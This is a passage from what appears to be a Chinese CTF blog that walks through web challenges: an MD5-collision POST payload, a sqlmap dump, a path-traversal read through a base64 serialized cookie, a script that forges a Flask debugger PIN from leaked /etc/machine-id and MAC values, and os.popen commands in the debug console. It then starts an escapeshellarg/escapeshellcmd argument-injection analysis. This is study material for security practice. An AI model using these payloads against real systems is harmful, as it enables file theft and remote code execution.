class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%00</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%55</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span>&amp;data<span class="number">2</span><span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%02</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%d5</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span></span></span><br></pre></td></tr></table></figure>
<p>得到返回包。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 28 Oct 2018 06:38:13 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.2.15 (CentOS)</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.3.3</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>156</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">MD5 cracking<span class="comment">&lt;!-- if((string)$_POST[&#x27;data1&#x27;]!==(string)$_POST[&#x27;data2&#x27;]&amp;&amp;md5($_POST[&#x27;data1&#x27;])===md5($_POST[&#x27;data2&#x27;]))--&gt;</span>flag</span><span class="template-variable">&#123;9bd1ee7355b58e53214adb9a37b4cb82&#125;</span></span></span><br></pre></td></tr></table></figure>
<h3 id="x05-新闻搜索">0x05 新闻搜索</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">简单的新闻搜索网站 http://114.55.36.69:8010</span><br></pre></td></tr></table></figure>
<p>简单的<strong>POST</strong>注入。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r <span class="string">&quot;sql.txt&quot;</span> -p word -D news -T admin -C <span class="string">&quot;flag,username&quot;</span> --dump</span><br></pre></td></tr></table></figure>
<p>得到<strong>flag{f98505d1d12f50a0bd9463e90876630}</strong>。</p>
<h3 id="x06-新写的小站">0x06 新写的小站</h3>
<p>安恒六月月赛的一道题，<strong>Mynote</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.55.36.69:8014</span><br></pre></td></tr></table></figure>
<p>打开<strong>robots.txt</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Allow: /controllers/Basecontrol.php</span><br><span class="line">Allow: /controllers/Controllers.php</span><br><span class="line">Allow: /controllers/User.php</span><br><span class="line">Allow: /flag.php</span><br></pre></td></tr></table></figure>
<p>点开<strong>flag</strong>看到<strong>flag{This_1S_A_F4ke_f1aG}</strong>，。。。假的，抓包。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php/picture</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>114.55.36.69:8014</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://114.55.36.69:8014/index.php/index</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>Picture=YToxMDp7aTowO3M6ODoiMTIzNC5waHAiO2k6MTtzOjE0OiJzb3V0aC5waHA7LmpwZyI7aToyO3M6MTY6IlFRMjAxODEwMjQtMS5qcGciO2k6MztzOjk6InNoZWxsLnBocCI7aTo0O3M6NjoiMTEucGhwIjtpOjU7czo1OiJhLmpwZyI7aTo2O3M6NjoiMTIucGhwIjtpOjc7czo3OiIxMjMucGhwIjtpOjg7czo5OiJzb3V0aC5waHAiO2k6OTtzOjU6IjEucGhwIjt9; PHPSESSID=u8hkg39ac7ao31onanenii8ifd</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>0.0.0.0</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br></pre></td></tr></table></figure>
<p>留意到<strong>Cookie</strong>中的<strong>Picture</strong>有些古怪，像是<strong>base64</strong>编码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YToxMDp7aTowO3M6ODoiMTIzNC5waHAiO2k6MTtzOjE0OiJzb3V0aC5waHA7LmpwZyI7aToyO3M6MTY6IlFRMjAxODEwMjQtMS5qcGciO2k6MztzOjk6InNoZWxsLnBocCI7aTo0O3M6NjoiMTEucGhwIjtpOjU7czo1OiJhLmpwZyI7aTo2O3M6NjoiMTIucGhwIjtpOjc7czo3OiIxMjMucGhwIjtpOjg7czo5OiJzb3V0aC5waHAiO2k6OTtzOjU6IjEucGhwIjt9</span><br></pre></td></tr></table></figure>
<p>一个<strong>Cookie</strong>任意文件读取。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:10:&#123;i:0;s:8:&quot;1234.php&quot;;i:1;s:14:&quot;south.php;.jpg&quot;;i:2;s:16:&quot;QQ20181024-1.jpg&quot;;i:3;s:9:&quot;shell.php&quot;;i:4;s:6:&quot;11.php&quot;;i:5;s:5:&quot;a.jpg&quot;;i:6;s:6:&quot;12.php&quot;;i:7;s:7:&quot;123.php&quot;;i:8;s:9:&quot;south.php&quot;;i:9;s:5:&quot;1.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>构造<strong>payload</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;i:0;s:14:&quot;../../flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>base64</strong>编码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30=</span><br></pre></td></tr></table></figure>
<p>传入参数。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php/picture</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>114.55.36.69:8014</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://114.55.36.69:8014/index.php/index</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>Picture=YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30%3D;PHPSESSID=u8hkg39ac7ao31onanenii8ifd</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>0.0.0.0</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br></pre></td></tr></table></figure>
<p>将读取到的文件以<strong>base64</strong>编码的形式返回。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;data:image/jpg;base64,PD9waHAKCiRmbGFnID0gImZsYWd7TjRtZV9zUGFjNF9Jc19JbnQzcjNzdDFuZ30iOwplY2hvICJmbGFne1RoaXNfMVNfQV9GNGtlX2YxYUd9IjsK&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
<p>解码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;N4me_sPac4_Is_Int3r3st1ng&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&#123;This_1S_A_F4ke_f1aG&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="x07-测试">0x07 测试</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.55.36.69:8014</span><br></pre></td></tr></table></figure>
<p>扫后台得到一个路径<strong>http://114.55.36.69:8013/console</strong>。</p>
<p>且登陆后在个人信息页面有一个任意文件读取【后来学长告诉我的，记笔记。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;/image/cGljLmpwZw%3D%3D &quot; alt=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>使用<strong>curl</strong>读就行。</p>
<p>然后百度了一下，先知有一篇文章，是<a
href="https://xz.aliyun.com/t/2553"><strong>Debug
Pin</strong>问题</a>。</p>
<p>我们需要以下几个值以求<strong>PIN</strong>的值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username就是启动这个Flask的用户</span><br><span class="line"></span><br><span class="line">modname为flask.app</span><br><span class="line"></span><br><span class="line">getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))为Flask</span><br><span class="line"></span><br><span class="line">getattr(mod, &#x27;__file__&#x27;, None)为flask目录下的一个app.py的绝对路径</span><br><span class="line"></span><br><span class="line">uuid.getnode()就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式</span><br><span class="line"></span><br><span class="line">get_machine_id()不妨跟进去看一下</span><br></pre></td></tr></table></figure>
<p>于是读取任意文件求值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/../../../usr/local/lib/python2.7/dist-packages/flask/app.py</span><br><span class="line">Antarctica:~ south$ curl http://114.55.36.69:8013/image/Ly4uLy4uLy4uL3Vzci9sb2NhbC9saWIvcHl0aG9uMi43L2Rpc3QtcGFja2FnZXMvZmxhc2svYXBwLnB5 &gt;app.py</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/../../../etc/machine-id</span><br><span class="line">Antarctica:~ south$ curl http://114.55.36.69:8013/image/Ly4uLy4uLy4uL2V0Yy9tYWNoaW5lLWlk</span><br><span class="line">3e608929fbd39b959f388bf468c9f0b1</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/../../../sys/class/net/eth0/address</span><br><span class="line">Antarctica:~ south$ curl http://114.55.36.69:8013/image/Ly4uLy4uLy4uL3N5cy9jbGFzcy9uZXQvZXRoMC9hZGRyZXNz</span><br><span class="line">02:42:c0:a8:2a:21</span><br></pre></td></tr></table></figure>
<p>把<strong>mac</strong>地址转换成<strong>16</strong>进制<strong>2485723343393</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/../../../etc/passwd</span><br><span class="line">Antarctica:~ south$ http://114.55.36.69:8013/image/Ly4uLy4uLy4uL2V0Yy9wYXNzd2Q=</span><br><span class="line">-bash: http://114.55.36.69:8013/image/Ly4uLy4uLy4uL2V0Yy9wYXNzd2Q=: No such file or directory</span><br><span class="line">Antarctica:~ south$ curl http://114.55.36.69:8013/image/Ly4uLy4uLy4uL2V0Yy9wYXNzd2Q=</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/bin/false</span><br><span class="line">mysql:x:999:999::/home/mysql:</span><br><span class="line">ctf:x:1000:1000::/home/ctf:/bin/bash</span><br></pre></td></tr></table></figure>
<p>最后附上抄来的脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python2.7/dist-packages/flask/app.pyc&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485723343393&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">&#x27;3e608929fbd39b959f388bf468c9f0b1&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PIN: 228-209-547</span><br></pre></td></tr></table></figure>
<p>得到<strong>PIN</strong>码后就可以使用<strong>Python</strong>指令进行操作了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&#x27;ls /&#x27;</span>).readlines()</span><br><span class="line">[<span class="string">&#x27;app\n&#x27;</span>, <span class="string">&#x27;bin\n&#x27;</span>, <span class="string">&#x27;boot\n&#x27;</span>, <span class="string">&#x27;dev\n&#x27;</span>, <span class="string">&#x27;docker-entrypoint-initdb.d\n&#x27;</span>, <span class="string">&#x27;entrypoint.sh\n&#x27;</span>, <span class="string">&#x27;etc\n&#x27;</span>, <span class="string">&#x27;fff111aaggggg___hhh\n&#x27;</span>,   ]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&#x27;cat /fff111aaggggg___hhh&#x27;</span>).readlines()</span><br><span class="line">[<span class="string">&#x27;flag&#123;d93743011d3158db70150a4301018b2c&#125;\n&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="x08-艰难的分析">0x08 艰难的分析</h3>
<p>啥玩意，照着安恒网易云课堂的<strong>wp</strong>做不出。</p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>安恒</tag>
        <tag>Web</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>2018 全国大学生软件测试大赛 安恒杯Web测试大赛 全国总决赛 部分题解</title>
    <url>/2018-AH-National-Final/</url>
    <content><![CDATA[<p>首发于<a
href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247485858&amp;idx=1&amp;sn=836733960365613f30bef731e1bc6f9e&amp;chksm=fbf793d2cc801ac4af4ea90579cc987f1ee1158c76b4617a374f0ff2a4888858385a1fae34d8&amp;mpshare=1&amp;scene=23&amp;srcid=%23rd">安恒网络空间安全讲武堂</a><strong>Orz</strong>。</p>
<p>太菜了只做出了几道水题，还是来赛后秒几题学习一下吧，水题就不赘述了。</p>
<span id="more"></span>
<h3 id="在线工具">在线工具</h3>
<p>先看源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$host</span> =(<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span>=<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span>=<span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;dbapp&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are in sandbox: &quot;</span>.<span class="variable">$sandbox</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5  -sT -Pn --host-timeout 2 -F  &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="两个重要函数">两个重要函数</h4>
<p>来看看官网给这两个函数的解释。</p>
<h5 id="escapeshellarg"><a
href="http://www.php.net/manual/zh/function.escapeshellarg.php">escapeshellarg</a></h5>
<p>将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入<strong>shell</strong>函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。<strong>shell</strong>函数包含<a
href="http://php.net/manual/zh/function.exec.php"><strong>exec()</strong></a>，<a
href="http://php.net/manual/zh/function.system.php"><strong>system()</strong></a>和<a
href="http://php.net/manual/zh/language.operators.execution.php">执行运算符</a>。</p>
<p><strong>简单说来它的功能就是确保用户只传递一个参数给命令，用户不能指定更多的参数，用户不能执行不同的命令
。</strong></p>
<h5 id="escapeshellcmd"><strong><a
href="http://php.net/manual/zh/function.escapeshellcmd.php">escapeshellcmd</a></strong></h5>
<p>对字符串中可能会欺骗<strong>shell</strong>命令执行任意命令的字符进行转义。
此函数保证用户输入的数据在传送到<a
href="http://php.net/manual/zh/function.exec.php"><strong>exec()</strong></a>或<a
href="http://php.net/manual/zh/function.system.php"><strong>system()</strong></a>函数，或者<a
href="http://php.net/manual/zh/language.operators.execution.php"><strong>执行运算符</strong></a>之前进行转义。</p>
<p>在转义过程中，反斜线会在以下字符之前插入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp; # ; ** | * ? ~ &lt; &gt; ^ ( ) [ ] &#123; &#125; $ \ \x0A \xFF</span><br></pre></td></tr></table></figure>
<p>而<strong>'</strong>和<strong>"</strong>仅在不配对的时候被转义，在<strong>Windows</strong>平台上，所有这些字符以及<strong>%</strong>和<strong>!</strong>字符都会被空格代替。</p>
<p><strong>简单说来它的功能就是确保用户只执行一个命令，用户可以指定不限数量的参数，用户不能执行不同的命令。</strong></p>
<h4 id="一个简单结论">一个简单结论</h4>
<p>对于单个单引号，<strong>escapeshellarg</strong>函数转义后，还会在被转义字符的左右字符串各加一个单引号进行连接，而<strong>escapeshellcmd</strong>函数是直接转义。对于成对的单引号，<strong>escapeshellcmd</strong>函数不转义，但<strong>escapeshellarg</strong>函数转义。</p>
<h4 id="一个简单举例">一个简单举例</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">    <span class="variable">$host</span> = <span class="string">&quot;127.0.0.1&#x27; -v -d a=1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$host</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$host</span>=<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$host</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$host</span>=<span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$host</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>打印出的字符串如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1&#x27; -v -d a=1</span><br><span class="line">&#x27;127.0.0.1&#x27;\&#x27;&#x27; -v -d a=1&#x27;</span><br><span class="line">&#x27;127.0.0.1&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;</span><br></pre></td></tr></table></figure>
<p>分解一下，首先<strong>escapeshellarg</strong>函数先对单引号转义，再用单引号将原单引号左右两部分括起来从而起到连接的作用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\&#x27;&#x27; -v -d a=1&#x27;</span><br></pre></td></tr></table></figure>
<p>然后<strong>escapeshellcmd</strong>函数对不成对单引号和反斜杠转义，即得到如下字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;</span><br></pre></td></tr></table></figure>
<p>最终字符串被分割成三个部分。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;</span><br><span class="line">\\</span><br><span class="line">&#x27;&#x27; </span><br><span class="line">-v -d </span><br><span class="line">a=1\&#x27;</span><br></pre></td></tr></table></figure>
<p>但是如果是先用<strong>escapeshellcmd</strong>函数，再用的<strong>escapeshellarg</strong>函数，则不会发生这个问题。</p>
<h4 id="赛题详解">赛题详解</h4>
<p>再来看看题目。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$host</span> =(<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span>=<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span>=<span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;dbapp&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are in sandbox: &quot;</span>.<span 